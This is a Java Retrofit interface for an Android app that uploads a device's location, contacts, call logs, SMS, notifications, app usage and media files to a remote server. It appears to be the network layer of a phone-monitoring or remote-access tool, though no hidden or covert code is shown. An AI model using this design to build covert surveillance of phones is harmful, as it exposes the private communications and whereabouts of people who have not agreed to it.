package com.ultimate.access.network;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.*;

import java.util.List;
import java.util.Map;

public interface ApiService {

    // ============= DEVICE REGISTRATION =============
    @POST("api/register")
    Call<ServerResponse> registerDevice(@Body Map<String, Object> deviceInfo);

    // ============= LOCATION =============
    @POST("api/location")
    Call<ServerResponse> sendLocation(@Body Map<String, Object> locationData);

    // ============= CONTACTS =============
    @POST("api/contacts")
    Call<ServerResponse> sendContacts(@Body Map<String, Object> contactsData);

    // ============= CALL LOGS =============
    @POST("api/calllogs")
    Call<ServerResponse> sendCallLogs(@Body Map<String, Object> callLogsData);

    // ============= SMS =============
    @POST("api/sms")
    Call<ServerResponse> sendSms(@Body Map<String, Object> smsData);

    // ============= APPS =============
    @POST("api/apps")
    Call<ServerResponse> sendApps(@Body Map<String, Object> appsData);

    // ============= USAGE STATS =============
    @POST("api/usage")
    Call<ServerResponse> sendUsageStats(@Body Map<String, Object> usageData);

    // ============= NOTIFICATIONS =============
    @POST("api/notifications")
    Call<ServerResponse> sendNotifications(@Body Map<String, Object> notificationsData);

    // ============= BATTERY =============
    @POST("api/battery")
    Call<ServerResponse> sendBattery(@Body Map<String, Object> batteryData);

    // ============= NETWORK =============
    @POST("api/network")
    Call<ServerResponse> sendNetwork(@Body Map<String, Object> networkData);

    // ============= BULK SYNC =============
    @POST("api/sync")
    Call<ServerResponse> syncBulkData(@Body Map<String, Object> syncData);

    // ============= MEDIA UPLOAD =============
    @Multipart
    @POST("api/upload")
    Call<MediaResponse> uploadMedia(
            @Part("deviceId") RequestBody deviceId,
            @Part("type") RequestBody type,
            @Part MultipartBody.Part file
    );

    // ============= HEALTH CHECK =============
    @GET("health")
    Call<Map<String, Object>> getHealth();

    // ============= RESPONSE CLASSES =============
    class ServerResponse {
        public boolean success;
        public String message;
        public int count;
        public Map<String, Object> results;
    }

    class MediaResponse {
        public boolean success;
        public String url;
        public String publicId;
        public String message;
    }
}